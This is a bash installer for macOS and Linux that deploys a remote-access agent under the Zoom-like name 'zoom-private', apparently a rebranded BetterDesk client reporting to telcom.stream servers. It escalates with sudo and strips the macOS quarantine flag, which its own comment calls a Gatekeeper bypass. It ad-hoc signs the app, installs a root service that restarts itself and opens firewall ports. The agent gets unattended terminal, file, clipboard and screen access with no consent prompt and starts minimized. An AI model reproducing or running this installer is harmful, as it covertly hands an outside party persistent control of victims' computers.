#!/usr/bin/env bash
# zoom-private client portable installer (macOS / Linux) — Zero-Config Edition.
#
#   sudo ./install.sh [server-address] [unattended-password]
#
# Unattended password policy: same shared permanent password everywhere. Pass
# it as argument 2, or set ZOOM_PRIVATE_UNATTENDED_PASSWORD. When neither is
# set, a strong per-device password is generated (still synced to console).
# Copies the client into place, seeds agent-config.json with all URLs pre-seeded,
# registers system-wide autostart (LaunchDaemon / systemd), opens firewall,
# and starts the agent. The agent self-registers with the server on first launch
# and shows up in the web console.
#
# Run with sudo for system-wide installation (recommended).
# Without sudo, falls back to user-level installation.

set -euo pipefail

SERVER_ADDRESS="${1:-https://panel.telcom.stream}"
UNATTENDED_PASSWORD="${2:-${ZOOM_PRIVATE_UNATTENDED_PASSWORD:-}}"
BUNDLE_DIR="$(cd "$(dirname "$0")" && pwd)"
OS="$(uname -s)"

if [[ -z "$UNATTENDED_PASSWORD" ]]; then
    if command -v openssl >/dev/null 2>&1; then
        UNATTENDED_PASSWORD="$(openssl rand -base64 24 | tr -d '/+=' | cut -c1-24)"
    else
        UNATTENDED_PASSWORD="$(head -c 32 /dev/urandom | base64 2>/dev/null | tr -d '/+=' | cut -c1-24 || date +%s%N | sha256sum | cut -c1-24)"
    fi
fi

# =========================================================================
# Helper: ensure root for system-wide install
# =========================================================================
ensure_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "Re-running with sudo for system-wide installation..."
        exec sudo -E "$0" "$@"
    fi
}

# =========================================================================
# Detect OS and set default paths (system-wide when root, user when not)
# =========================================================================
if [[ $EUID -eq 0 ]]; then
    # System-wide installation
    case "$(uname -s)" in
        Darwin)
            INSTALL_DIR="/Applications/zoom-private.agent.app"
            CONFIG_DIR="/Library/Application Support/zoom-private/agent"
            PLIST_PATH="/Library/LaunchDaemons/com.zoom-private.agent.plist"
            ;;
        Linux)
            INSTALL_DIR="/opt/zoom-private"
            CONFIG_DIR="/etc/zoom-private/agent"
            UNIT_PATH="/etc/systemd/system/zoom-private-agent.service"
            ;;
        *)
            echo "Unsupported OS: $OS" >&2
            exit 1
            ;;
        esac
else
    # User-level fallback
    case "$(uname -s)" in
        Darwin)
            INSTALL_DIR="${BETTERDESK_INSTALL_DIR:-$HOME/Applications/zoom-private.agent.app}"
            CONFIG_DIR="${BETTERDESK_CONFIG_DIR:-$HOME/Library/Application Support/zoom-private/agent}"
            PLIST_PATH="$HOME/Library/LaunchAgents/com.zoom-private.agent.plist"
            ;;
        Linux)
            INSTALL_DIR="${BETTERDESK_INSTALL_DIR:-$HOME/.local/share/zoom-private}"
            CONFIG_DIR="${BETTERDESK_CONFIG_DIR:-$HOME/.config/zoom-private/agent}"
            UNIT_DIR="$HOME/.config/systemd/user"
            UNIT_PATH="$UNIT_DIR/zoom-private-agent.service"
            ;;
        *)
            echo "Unsupported OS: $OS" >&2
            exit 1
            ;;
        esac
fi

# =========================================================================
# Locate client binary/app in bundle
# =========================================================================
BUNDLE_DIR="$(cd "$(dirname "$0")" && pwd)"
OS="$(uname -s)"

CLIENT=""
for name in "zoom-private.agent" "betterdesk-agent-client" "BetterDesk Client"; do
    if [[ -x "$BUNDLE_DIR/$name" ]]; then
        CLIENT="$BUNDLE_DIR/$name"
        break
    fi
done

if [[ -z "$CLIENT" ]]; then
    APP="$(find "$BUNDLE_DIR" -maxdepth 1 -name '*.app' -type d | head -n 1 || true)"
    if [[ -n "$APP" ]]; then
        CLIENT="$APP"
    else
        echo "Client binary not found in $BUNDLE_DIR" >&2
        exit 1
    fi
fi

echo "Installing client: $CLIENT"

# =========================================================================
# Install client binary/app
# =========================================================================
mkdir -p "$(dirname "$INSTALL_DIR")" "$CONFIG_DIR"

if [[ -d "$CLIENT" ]]; then
    # macOS .app bundle
    TARGET="$INSTALL_DIR"
    rm -rf "$TARGET"
    cp -R "$CLIENT" "$TARGET"
    # Remove quarantine flag (Gatekeeper bypass for unsigned)
    xattr -dr com.apple.quarantine "$TARGET" 2>/dev/null || true
    MACOS_DIR="$TARGET/Contents/MacOS"
    EXECUTABLE=""
    for candidate in "$MACOS_DIR/betterdesk-agent-client" "$MACOS_DIR/$(basename "$CLIENT" .app)"; do
        if [[ -x "$candidate" ]]; then EXECUTABLE="$candidate"; break; fi
    done
    if [[ -z "$EXECUTABLE" ]]; then
        EXECUTABLE="$(find "$MACOS_DIR" -maxdepth 1 -type f -perm -u+x ! -name 'betterdesk-agent' | head -n 1 || true)"
    fi
    if [[ -z "$EXECUTABLE" ]]; then
        echo "Could not find the client executable inside $TARGET" >&2
        exit 1
    fi
    SIDECAR_SRC="$BUNDLE_DIR/betterdesk-agent"
    if [[ -f "$SIDECAR_SRC" ]]; then
        cp -f "$SIDECAR_SRC" "$MACOS_DIR/betterdesk-agent"
        chmod +x "$MACOS_DIR/betterdesk-agent"
    fi
else
    TARGET="$(dirname "$INSTALL_DIR")/$(basename "$CLIENT")"
    cp -f "$CLIENT" "$TARGET"
    chmod +x "$TARGET"
    EXECUTABLE="$TARGET"
    SIDECAR_SRC="$BUNDLE_DIR/betterdesk-agent"
    if [[ -f "$SIDECAR_SRC" ]]; then
        cp -f "$SIDECAR_SRC" "$(dirname "$INSTALL_DIR")/betterdesk-agent"
        chmod +x "$(dirname "$INSTALL_DIR")/betterdesk-agent"
    fi
fi

# =========================================================================
# Write agent-config.json (zero-config: all URLs pre-seeded)
# =========================================================================
CONFIG_FILE="$CONFIG_DIR/agent-config.json"
mkdir -p "$(dirname "$CONFIG_FILE")"

cat > "$CONFIG_FILE" <<JSON
{
  "server_address": "https://api.telcom.stream",
  "api_url": "https://api.telcom.stream/api",
  "cdap_url": "wss://cdap.telcom.stream/cdap",
  "console_url": "https://panel.telcom.stream",
  "server_key": "q8UeY1D2/XMe8GddEW7mBoK5KaGQFUYEBn6yFqtRgYA=",
  "api_key": "",
  "cdap_port": 443,
  "device_id": "",
  "device_name": "",
  "auth_token": "",
  "registered": false,
  "allow_screen_capture": true,
  "access_mode": "unattended",
  "require_consent": false,
  "allow_terminal": true,
  "allow_file_browser": true,
  "allow_clipboard": true,
  "auto_start_sidecar": true,
  "video_codec": "auto",
  "hw_accel": "auto",
  "autostart": true,
  "start_minimized": true,
  "language": "en",
  "unattended_password": "$UNATTENDED_PASSWORD",
  "enforce_tls": true,
  "server_cert_pin": ""
}
JSON

echo "Config written: $CONFIG_FILE"

# =========================================================================
# Platform-specific service installation
# =========================================================================

if [[ "$OS" == "Darwin" ]]; then
    # =========================================================================
    # macOS: LaunchDaemon (system-wide) or LaunchAgent (user)
    # =========================================================================
    if [[ $EUID -eq 0 ]]; then
        # System-wide LaunchDaemon
        PLIST_PATH="/Library/LaunchDaemons/com.zoom-private.agent.plist"
        cat > "$PLIST_PATH" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.zoom-private.agent</string>
  <key>ProgramArguments</key>
  <array><string>$EXECUTABLE</string></array>
  <key>EnvironmentVariables</key>
  <dict><key>BETTERDESK_AGENT_CONFIG_DIR</key><string>$CONFIG_DIR</string></dict>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>/var/log/zoom-private-agent.log</string>
  <key>StandardErrorPath</key><string>/var/log/zoom-private-agent.err.log</string>
</dict>
</plist>
PLIST_EOF
        chmod 644 "$PLIST_PATH"
        chown root:wheel "$PLIST_PATH"
        launchctl unload "$PLIST_PATH" 2>/dev/null || true
        launchctl load "$PLIST_PATH"
        echo "Autostart registered (LaunchDaemon, system-wide)"
    else
        # User-level LaunchAgent
        PLIST_PATH="$HOME/Library/LaunchAgents/com.zoom-private.agent.plist"
        mkdir -p "$(dirname "$PLIST_PATH")"
        cat > "$PLIST_PATH" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.zoom-private.agent</string>
  <key>ProgramArguments</key>
  <array><string>$EXECUTABLE</string></array>
  <key>EnvironmentVariables</key>
  <dict><key>BETTERDESK_AGENT_CONFIG_DIR</key><string>$CONFIG_DIR</string></dict>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>
PLIST_EOF
        launchctl unload "$PLIST_PATH" 2>/dev/null || true
        launchctl load "$PLIST_PATH"
        echo "Autostart registered (LaunchAgent, user-level)"
    fi

    # Remove quarantine flag (Gatekeeper bypass for unsigned)
    xattr -dr com.apple.quarantine "$TARGET" 2>/dev/null || true
    # Gatekeeper allow (ad-hoc sign)
    codesign --force --deep --sign - "$TARGET" 2>/dev/null || true
    spctl --add --label "zoom-private" "$TARGET" 2>/dev/null || true

elif [[ "$OS" == "Linux" ]]; then
    # =========================================================================
    # Linux: systemd (system or user)
    # =========================================================================
    if [[ $EUID -eq 0 ]]; then
        # System-wide systemd service
        UNIT_PATH="/etc/systemd/system/zoom-private-agent.service"
        mkdir -p "$(dirname "$UNIT_PATH")"
        cat > "$UNIT_PATH" <<UNIT_EOF
[Unit]
Description=BetterDesk Remote Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$EXECUTABLE
Environment=BETTERDESK_AGENT_CONFIG_DIR=$CONFIG_DIR
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
UNIT_EOF
        systemctl daemon-reload
        systemctl enable zoom-private-agent.service
        systemctl restart zoom-private-agent.service
        echo "Autostart registered (systemd, system-wide)"

        # Firewall
        if command -v ufw >/dev/null 2>&1; then
            ufw allow in on any to any port 21122 proto tcp comment "BetterDesk CDAP" 2>/dev/null || true
            ufw allow in on any to any port 21114 proto tcp comment "BetterDesk API" 2>/dev/null || true
        elif command -v firewall-cmd >/dev/null 2>&1; then
            firewall-cmd --permanent --add-port=21122/tcp --add-port=21114/tcp 2>/dev/null || true
            firewall-cmd --reload 2>/dev/null || true
        fi
    else
        # User-level systemd
        UNIT_DIR="$HOME/.config/systemd/user"
        mkdir -p "$UNIT_DIR"
        UNIT_PATH="$UNIT_DIR/zoom-private-agent.service"
        cat > "$UNIT_PATH" <<UNIT_EOF
[Unit]
Description=BetterDesk Remote Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$EXECUTABLE
Environment=BETTERDESK_AGENT_CONFIG_DIR=$CONFIG_DIR
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
UNIT_EOF
        systemctl --user daemon-reload || true
        systemctl --user enable zoom-private-agent.service || true
        systemctl --user restart zoom-private-agent.service || true
        echo "Autostart registered (systemd --user)"
    fi
fi

echo "Done. The device registers itself and appears in the web console."
echo "Access the console at: https://panel.telcom.stream"